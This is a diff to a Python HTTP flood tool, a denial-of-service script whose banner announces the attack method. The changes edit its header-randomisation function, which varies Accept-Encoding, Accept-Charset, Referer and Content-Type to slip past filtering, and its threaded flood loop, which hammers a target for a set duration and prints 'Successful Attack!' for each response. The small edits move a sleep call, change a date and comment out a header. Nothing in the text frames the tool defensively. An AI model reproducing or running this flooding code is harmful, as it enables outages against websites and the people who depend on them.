@@ -18,7 +18,7 @@ from requests.exceptions import ConnectionError, Timeout
 
 os.system('clear')
 
-with open("info.json", "r") as f:
+with open("../info.json", "r") as f:
     data = json.load(f)
     version = data["version"]
     auther = data["auther"]
@@ -45,7 +45,7 @@ logo = cfonts.render(
 print(logo)
 print('-' * 60)
 print(f"""
-Version : {F.CYAN}{version} {F.RESET}( {F.CYAN}2024 {F.WHITE}- {F.CYAN}11 {F.WHITE}- {F.CYAN}20 {F.RESET}).
+Version : {F.CYAN}{version} {F.RESET}( {F.CYAN}2024 {F.WHITE}- {F.CYAN}11 {F.WHITE}- {F.CYAN}21 {F.RESET}).
 Auther  : {F.CYAN}{auther}{F.RESET}.
 Method  : {F.CYAN}HTTP{F.RESET}.
 """)
@@ -101,7 +101,7 @@ def generate_headers():
     acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
     random.shuffle(acceptEncoding)
     roundEncodings = acceptEncoding[:random.randint(1, int(len(acceptEncoding) / 2))]
-    
+
     acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
     random.shuffle(acceptCharset)
     
@@ -114,7 +114,7 @@ def generate_headers():
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Encoding": ', '.join(roundEncodings),
         "Accept-Charset": '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1)),
-        "Accept-Language": "en-US,en;q=0.9",
+        #"Accept-Language": "en-US,en;q=0.9",
         "Referer": referesBot(),
         "Content-Type": random.choice(['multipart/form-data', 'application/x-url-encoded']),
         #"DNT": "1",
@@ -145,13 +145,14 @@ def flood(target: str) -> None:
             status = f"{s_color}({response.status_code}){F.RESET}"
             payload_size = f"{s_color} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             print(f"{status} --> {F.CYAN}{type_request}{F.RESET} Successful Attack! | Payload Size: {payload_size}")
-            print(headers["Host"])
-            time.sleep(timeSleep)
+            
         except (Timeout, OSError):
             print(f"{F.RED}( !!! ) {F.RESET}Time Out...")
             continue
 
+        time.sleep(timeSleep)
 
+# ------------------------
 def start_flooding(target: str, thread_count: int, duration: int) -> None:
     stop_time = time.time() + duration
     for _ in range(thread_count):
